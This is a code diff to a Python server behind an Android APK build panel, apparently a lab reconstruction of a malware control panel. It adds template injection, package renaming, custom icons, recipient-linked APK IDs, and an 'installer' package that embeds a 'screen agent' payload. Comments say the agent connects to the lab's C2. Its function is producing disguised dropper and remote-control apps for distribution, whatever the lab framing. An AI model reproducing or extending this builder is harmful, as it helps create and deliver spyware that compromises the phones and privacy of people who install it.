@@ -1022,7 +1022,9 @@ _BUILD_SDK = r"C:\1\sdk"
 _BUILD_JDK = r"C:\1\tools\jdk\jdk-17.0.20.1+1"
 _BUILD_OUT = os.path.join(_BUILD_REPRO, 'build', 'labagent.apk')
 _BUILD_DEST_DIR = os.path.join(HERE, '..', 'build')       # 墨影v2/build/，供 /dl/ 路由下载
-_BUILD_DEST = os.path.join(_BUILD_DEST_DIR, 'labagent.apk')
+_BUILD_DEST = os.path.join(_BUILD_DEST_DIR, 'labagent.apk')          # tools/apk_build.py 的固定输出（能力桩）
+_BUILD_DEST_REAL = os.path.join(_BUILD_DEST_DIR, 'cloudfinder.apk')   # 模板注入的真包
+_BUILD_DEST_STUB = os.path.join(_BUILD_DEST_DIR, 'stub.apk')          # 无模板时的占位包
 
 
 def _build_env():
@@ -1115,15 +1117,14 @@ def _finish_build_job(job_id, path, note_prefix='构建完成'):
         j['status'] = 'done'
         j['apkPath'] = '/dl/%s' % public_name
         j['note'] = '%s，%d 字节 (sha256: %s)' % (note_prefix, size, sha[:16])
+        j['apkSize'] = size
+        j['apkSha256'] = sha
     return size, sha
 
 
-def _fallback_build_apk(j):
-    try:
-        import relay_builder
-    except Exception:
-        from server import relay_builder
-    cfg = {
+def _build_cfg(j):
+    """面板提交的任务 → 构建器配置。"""
+    return {
         'appid': j.get('packageName') or 'com.ref.labagent',
         'app_package': j.get('packageName') or 'com.ref.labagent',
         'appname': j.get('appName') or 'labagent',
@@ -1132,7 +1133,78 @@ def _fallback_build_apk(j):
         'buildType': j.get('buildType') or '1.0',
         'apkVersion': j.get('apkVersion') or j.get('buildType') or '1.0',
     }
-    return relay_builder.build_apk(cfg, _BUILD_DEST)
+
+
+def _fallback_build_apk(j):
+    try:
+        import relay_builder
+    except Exception:
+        from server import relay_builder
+    return relay_builder.build_apk(_build_cfg(j), _BUILD_DEST_STUB)
+
+
+def _apk_package(path):
+    """从产物清单里读**真实**包名。
+
+    面板填的 packageName 只是个配置项：模板注入的包沿用模板包名，
+    apk_build.py 产出的则是写死的 com.ref.labagent。记录里必须写真实包名，
+    否则"下载下来不是想要的那个包"这种问题永远看不出来。
+    """
+    try:
+        import sys as _sys
+        import zipfile
+        tools = os.path.join(HERE, '..', 'tools')
+        if tools not in _sys.path:
+            _sys.path.insert(0, tools)
+        from dexlib import AxmlReader
+        with zipfile.ZipFile(path) as z:
+            return AxmlReader(z.read('AndroidManifest.xml')).manifest_summary().get('package', '')
+    except Exception:
+        return ''
+
+
+def _assert_product(path, snap=None):
+    """产物身份断言：清单可解析、包名非空、有 launcher（按模板 visibleLauncher）。
+
+    对齐 yuankon 在 `aapt badging` 阶段做的断言 —— 编译成功不等于产物正确。
+    """
+    import zipfile as _zip
+    pkg, acts = '', 0
+    try:
+        import sys as _sys
+        tools = os.path.join(HERE, '..', 'tools')
+        if tools not in _sys.path:
+            _sys.path.insert(0, tools)
+        from dexlib import AxmlReader
+        with _zip.ZipFile(path) as z:
+            ax = AxmlReader(z.read('AndroidManifest.xml'))
+            pkg = ax.manifest_summary().get('package', '')
+            acts = sum(1 for t, _a, _d in ax.elements
+                       if t in ('activity', 'activity-alias'))
+    except Exception as e:
+        raise Exception('产物清单解析失败：%s' % e)
+    if not pkg:
+        raise Exception('产物清单没有包名')
+    if snap and snap.get('visibleLauncher') and acts == 0:
+        raise Exception('基座声明有桌面入口，但产物里没有任何 activity')
+    return pkg, acts
+
+
+def _describe_real_package(res, j):
+    ver = j.get('apkVersion') or j.get('buildType') or '?'
+    mb = (res.get('size', 0) or 0) / 1048576.0
+    pkg = res.get('package') or ''
+    icon = j.get('icon')
+    snap = j.get('templateSnapshot') or {}
+    tail = ('，包名 %s' % pkg if pkg else '') + ('，自定义图标' if icon else '')
+    if snap.get('id'):
+        tail += '，模板 %s' % snap['id']
+    if j.get('apkId'):
+        tail += '，APK ID %s→%s' % (j['apkId'], (j.get('recipient') or {}).get('account', '?'))
+    if res.get('template_fallback'):
+        return '真包完成（v%s 无专属模板，回退 %s，%.1f MB%s）' % (
+            ver, res.get('template', '?'), mb, tail)
+    return '真包完成（模板 %s，%.1f MB%s）' % (res.get('template', '?'), mb, tail)
 
 
 def _run_build_worker(job_id):
@@ -1142,8 +1214,124 @@ def _run_build_worker(job_id):
         j['note'] = '正在编译并签名…'
     save()
     try:
-        import subprocess, sys
+        import subprocess, sys, zipfile
         os.makedirs(_BUILD_DEST_DIR, exist_ok=True)
+
+        # ---- 1) 有真模板：直接模板注入（真 dex + 真签名）。
+        #      必须先走这条，否则一旦这台机器装了 Android SDK，tools/apk_build.py 会
+        #      抢先产出 33 KB 的实验室 agent 包（com.ref.labagent），面板就当成功交付了。
+        try:
+            import relay_builder
+        except Exception:
+            from server import relay_builder
+        pol = _policy()
+        snap = j.get('templateSnapshot') or {}
+        clean = j.get('clean') or _build_cfg(j)
+        rec = j.get('recipient') or {}
+        template_path = ''
+        src_dir = (os.path.join(pol.ROOT, snap['sourceDir']) if snap.get('sourceDir') else None)
+        if snap.get('file'):
+            template_path = os.path.join(pol.TEMPLATE_DIR, snap['file'])
+            if not os.path.isfile(template_path):
+                raise Exception('基座文件缺失：%s（模板 %s）' % (snap['file'], snap.get('id')))
+        if isinstance(clean, dict):
+            # 注入字段里记一个包名（没填就记记录用的默认值），但**改名只用用户真填的值**
+            inject_clean = dict(clean)
+            inject_clean['packageName'] = clean.get('packageName') or j.get('packageName') or ''
+        else:
+            inject_clean = clean
+        inject = pol.inject_values(inject_clean, rec, snap, job_id) if snap else None
+        cfg = _build_cfg(j)
+        if inject:
+            cfg['inject'] = inject
+
+        # ---- 源码模板：复制工程 → 写应用名/版本/包名/图标/配置 → apktool b → 签名
+        if snap.get('mode') == 'source' and (snap.get('kind') == 'installer'):
+            import source_builder
+            icon_bytes = None
+            if j.get('icon'):
+                try:
+                    import relay_builder as _rb
+                    icon_bytes = _rb._read_icon(j['icon'])
+                except Exception:
+                    icon_bytes = None
+            pl = j.get('payload') or {}
+            if not pl.get('path') or not os.path.isfile(pl['path']):
+                raise Exception('A 包内嵌的 B 包产物已不存在，请重新构建 B 包')
+            work = os.path.join(_BUILD_DEST_DIR, '.work', job_id)
+            try:
+                info = source_builder.build_from_source(
+                    {'appName': j.get('appName') or 'app',
+                     'versionName': snap.get('versionName') or '1.3.1',
+                     'versionCode': snap.get('versionCode') or 5,
+                     'packageName': (clean.get('packageName') or ''),
+                     'kind': 'installer',
+                     'visibleLauncher': True,
+                     'icon_bytes': icon_bytes,
+                     'payload_path': pl['path'], 'payload_package': pl.get('package'),
+                     'payload_name': pl.get('appName'), 'payload_build_id': pl.get('buildId'),
+                     'inject': inject or {}},
+                    work, os.path.join(work, 'out.apk'), source_dir=src_dir)
+                shutil.copyfile(info['path'], _BUILD_DEST_REAL)
+            finally:
+                shutil.rmtree(work, ignore_errors=True)
+            ic = info.get('installer_config') or {}
+            note = ('A 包构建完成（模板 %s，%.2f MB，包名 %s%s；内嵌 B 包 %s %s，sha %s）'
+                    % (snap.get('id'), info['size'] / 1048576.0, info['package'],
+                       '，改名自 %s' % info['old_package'] if info.get('package_renamed') else '',
+                       ic.get('payloadPackageName') or '?', ic.get('payloadBuildId') or '?',
+                       (ic.get('payloadSha256') or '')[:12]))
+            _finish_build_job(job_id, _BUILD_DEST_REAL, note)
+            return
+
+        if snap.get('mode') == 'source':
+            import source_builder
+            icon_bytes = None
+            if j.get('icon'):
+                try:
+                    import relay_builder as _rb
+                    icon_bytes = _rb._read_icon(j['icon'])
+                except Exception:
+                    icon_bytes = None
+            work = os.path.join(_BUILD_DEST_DIR, '.work', job_id)
+            try:
+                info = source_builder.build_from_source(
+                    {'appName': j.get('appName') or clean.get('appName') or 'app',
+                     'versionName': snap.get('versionName') or clean.get('templateId'),
+                     'versionCode': snap.get('versionCode') or 0,
+                     'packageName': (clean.get('packageName') or ''),
+                     'kind': snap.get('kind') or 'screenagent',
+                     'icon_bytes': icon_bytes,
+                     'visibleLauncher': bool(snap.get('visibleLauncher', True)),
+                     'inject': inject or {}},
+                    work, os.path.join(work, 'out.apk'), source_dir=src_dir)
+                shutil.copyfile(info['path'], _BUILD_DEST_REAL)
+            finally:
+                # 每次源码构建都会复制一份 90MB 工程，必须清掉，否则 build/.work 会一直涨
+                shutil.rmtree(work, ignore_errors=True)
+            src_note = '源码构建完成（模板 %s，%.1f MB，包名 %s%s%s，APK ID %s→%s）' % (
+                snap.get('id'), info['size'] / 1048576.0, info['package'],
+                '，改名自 %s' % info['old_package'] if info.get('package_renamed') else '',
+                '，自定义图标' if icon_bytes else '',
+                j.get('apkId'), (j.get('recipient') or {}).get('account', '?'))
+            _finish_build_job(job_id, _BUILD_DEST_REAL, src_note)
+            return
+
+        if template_path:
+            res = relay_builder.build_apk(cfg, _BUILD_DEST_REAL,
+                                          icon_path=(j.get('icon') or None),
+                                          template_path=template_path)
+            if res.get('stub'):
+                raise Exception('基座不可用：%s' % (res.get('template_error') or ''))
+            _assert_product(_BUILD_DEST_REAL, snap)
+            _finish_build_job(job_id, _BUILD_DEST_REAL, _describe_real_package(res, j))
+            return
+            j = _find_job(job_id)
+            if j:
+                j['note'] = '模板不可用（%s），尝试系统构建工具…' % (res.get('template_error', '')[:80])
+                save()
+
+        # ---- 2) 无模板：试 tools/apk_build.py（需要 Android SDK 的 aapt2/d8/zipalign/apksigner）
         build_script = os.path.join(HERE, '..', 'tools', 'apk_build.py')
         env = dict(os.environ)
         env['ANDROID_HOME'] = env.get('ANDROID_HOME') or '/opt/android-sdk'
@@ -1152,29 +1340,31 @@ def _run_build_worker(job_id):
                                 capture_output=True, text=True, timeout=120)
         combined_output = ((result.stdout or '') + (result.stderr or '')).strip()
         if result.returncode == 0 and os.path.exists(_BUILD_DEST):
-            _finish_build_job(job_id, _BUILD_DEST)
-        else:
-            j = _find_job(job_id)
-            if j:
-                j['note'] = '系统构建工具不可用，切换内置构建器…'
-                save()
-                res = _fallback_build_apk(j) or {}
-                detail = combined_output[-120:] if combined_output else '缺少系统构建工具'
-                if res.get('stub'):
-                    # 占位包：结构合法但只有 397 字节 dex、没有真签名，装不上。
-                    # 以前这里统一写"构建完成"，面板上完全看不出区别，就是"每次构建只有十 KB"的由来。
-                    note = '占位包（无真模板，%d 字节，装不上）：%s' % (
-                        res.get('size', 0), res.get('template_error') or detail)
-                elif res.get('template_fallback'):
-                    note = '真包完成（v%s 无专属模板，回退 %s，%.1f MB）' % (
-                        j.get('apkVersion') or j.get('buildType') or '?',
-                        res.get('template', '?'), (res.get('size', 0) or 0) / 1048576.0)
-                else:
-                    note = '真包完成（模板 %s，%.1f MB）' % (
-                        res.get('template', '?'), (res.get('size', 0) or 0) / 1048576.0)
-                _finish_build_job(job_id, _BUILD_DEST, note)
+            size = os.path.getsize(_BUILD_DEST)
+            pkg = _apk_package(_BUILD_DEST)
+            if size >= 1024 * 1024 or pkg != 'com.ref.labagent':
+                note = '构建完成（%s，%.1f MB）' % (pkg or '?', size / 1048576.0)
             else:
-                raise Exception('构建任务不存在')
+                # 轻量 agent：结构真实、能装、能连实验室 C2，但只有 29 个类，不是样本真包
+                note = '轻量 agent 包（%s，%d KB，29 类；非样本真包——缺 materials/templates/base.apk）' % (
+                    pkg or '?', size // 1024)
+            _finish_build_job(job_id, _BUILD_DEST, note)
+            return
+
+        # ---- 3) 都没有：占位包（结构合法、装不上），必须显式标注
+        j = _find_job(job_id)
+        if not j:
+            raise Exception('构建任务不存在')
+        j['note'] = '系统构建工具不可用，切换内置构建器…'
+        save()
+        res = _fallback_build_apk(j) or {}
+        detail = combined_output[-120:] if combined_output else '缺少系统构建工具'
+        if res.get('stub'):
+            note = '占位包（无真模板，%d 字节，装不上）：%s' % (
+                res.get('size', 0), res.get('template_error') or detail)
+        else:
+            note = _describe_real_package(res, j)
+        _finish_build_job(job_id, _BUILD_DEST, note)
     except Exception as ex:
         j = _find_job(job_id)
         if j:
@@ -1184,33 +1374,111 @@ def _run_build_worker(job_id):
 
 
 def h_builds(b, q, a):
-    return {'ok': True, 'builds': _normalize_all_builds()}
+    rows = _normalize_all_builds()
+    me = next((u for u in S.get('users') or [] if u.get('username') == a), None)
+    if me and str(me.get('role') or 'user') != 'admin':
+        rows = [r for r in rows
+                if r.get('owner') == a or (r.get('recipient') or {}).get('account') == a]
+    return {'ok': True, 'builds': rows}
+
+
+def _policy():
+    try:
+        import build_policy
+        return build_policy
+    except Exception:
+        from server import build_policy
+        return build_policy
+
+
+def _latest_payload_build():
+    """A 包要内嵌的 B 包：取最近一次成功、且模板是 screenagent 的构建产物。"""
+    rows = []
+    for j in (S.get('builds') or []):
+        snap = j.get('templateSnapshot') or {}
+        if j.get('status') != 'done' or not j.get('apkPath'):
+            continue
+        if snap.get('kind') not in (None, 'screenagent'):
+            continue
+        path = os.path.join(_BUILD_DEST_DIR, '%s.apk' % j.get('id'))
+        if not os.path.isfile(path):
+            continue
+        rows.append((j.get('ts') or 0, j, path))
+    if not rows:
+        return None
+    rows.sort(key=lambda r: r[0], reverse=True)
+    _ts, j, path = rows[0]
+    return {'buildId': j.get('id'), 'path': path, 'apkPath': j.get('apkPath'),
+            'package': _apk_package(path), 'appName': j.get('appName') or '',
+            'size': os.path.getsize(path)}
+
+
+def h_build_templates(b, q, a):
+    """可选基座清单：面板构建页的下拉数据源（管理员维护 templates.json）。"""
+    return _policy().load_manifest()
 
 
 def h_build(b, q, a):
+    """提交构建：白名单校验 → 解析基座 → 解析 APK ID 归属 → 入队。
+
+    校验不过直接返回错误，不进队列（对齐 yuankon 的 zod .strict() 行为）。
+    """
+    pol = _policy()
+    try:
+        clean = pol.validate_input(b or {})
+        tpl = pol.resolve_template(clean['templateId'])
+        rec = pol.resolve_recipient(S.get('users') or [], a or 'admin', clean['apkId'])
+        payload = None
+        if tpl.get('kind') == 'installer':
+            payload = _latest_payload_build()
+            if not payload:
+                raise pol.BuildInputError('还没有可用的 B 包产物：请先构建一次 B 包（工作端），A 包要内嵌它')
+        if clean.get('icon') and not tpl.get('iconReplaceable'):
+            raise pol.BuildInputError(
+                '基座 %s 的资源名是混淆的，换不了图标；请选资源语义化的基座（如 v2.1）'
+                % tpl['id'])
+    except pol.BuildInputError as e:
+        audit(a, 'build_reject', str(e)[:80])
+        return {'ok': False, 'error': str(e)}
+
     jid = secrets.token_hex(4)
-    app_name = b.get('appName') or b.get('appname') or 'labagent'
-    package_name = (b.get('packageName') or b.get('appPackage') or b.get('app_package')
-                    or ('com.ref.' + _slug_name(app_name)))
     ts = now()
+    snap = {k: tpl.get(k) for k in ('id', 'name', 'versionName', 'versionCode', 'file',
+                                    'sha256', 'resourceStyle', 'iconReplaceable',
+                                    'mode', 'sourceDir', 'visibleLauncher', 'kind')}
     job = {'id': jid, 'buildId': jid, 'ts': ts, 'createdAt': _format_ts(ts),
            'owner': a or 'system', 'status': 'queued',
-           'apkId': b.get('apkId', '10020'), 'profile': b.get('profile', 'default'),
-           'appName': app_name, 'packageName': package_name,
-           'homepage': b.get('homepage') or b.get('appurl') or b.get('url') or '',
-           'buildType': b.get('buildType') or b.get('apkVersion') or '1.0',
-           'apkVersion': b.get('apkVersion') or b.get('buildType') or '1.0',
+           'apkId': rec['apkId'], 'recipient': rec,
+           'profile': b.get('profile', 'default'),
+           'appName': clean['appName'],
+           'packageName': clean.get('packageName') or ('com.se.lfi.p%s' % jid),
+           'homepage': clean.get('homeUrl') or '',
+           'domain': clean.get('domain') or '',
+           'buildType': clean['templateId'],
+           'apkVersion': tpl.get('versionName') or clean['templateId'],
+           'templateId': tpl['id'], 'templateSnapshot': snap,
+           'kind': tpl.get('kind') or 'screenagent',
+           'payload': payload,
+           'icon': clean.get('icon') or '',
+           'batch': clean.get('batch') or '',
+           'features': clean.get('features') or {},
+           'clean': clean,
            'apkPath': '', 'note': '排队中'}
     S['builds'].append(job)
-    audit(a, 'build', jid)
+    audit(a, 'build', '%s %s apkId=%s' % (jid, tpl['id'], rec['apkId']))
     save()
     threading.Thread(target=_run_build_worker, args=(jid,), daemon=True).start()
-    return {'ok': True, 'buildId': jid, 'status': 'queued', 'build': _normalize_build_job(job)}
+    return {'ok': True, 'buildId': jid, 'status': 'queued',
+            'template': snap, 'recipient': rec, 'build': _normalize_build_job(job)}
 
 
 def h_build_status(b, q, a):
     bid = q.get('id') or b.get('id')
     j = _find_job(bid)
+    me = next((u for u in S.get('users') or [] if u.get('username') == a), None)
+    if j and me and str(me.get('role') or 'user') != 'admin':
+        if j.get('owner') != a and (j.get('recipient') or {}).get('account') != a:
+            return {'ok': False, 'error': 'not found'}
     if j:
         return {'ok': True, 'status': j.get('status'), 'apkPath': j.get('apkPath', ''), 'build': _normalize_build_job(j)}
     return {'ok': False, 'error': 'not found'}
@@ -1478,6 +1746,7 @@ _t('/api/applock-detect', {'GET': h_applock})
 _t('/api/adb-status', {'GET': h_adb_status})
 _t('/api/icon-upload', {'POST': h_icon_upload})
 _t('/api/builds', {'GET': h_builds})
+_t('/api/build/templates', {'GET': h_build_templates})
 _t('/api/build', {'POST': h_build, 'GET': h_builds})
 _t('/api/build/status', {'GET': h_build_status})
 _t('/api/build/delete', {'POST': h_build_delete})
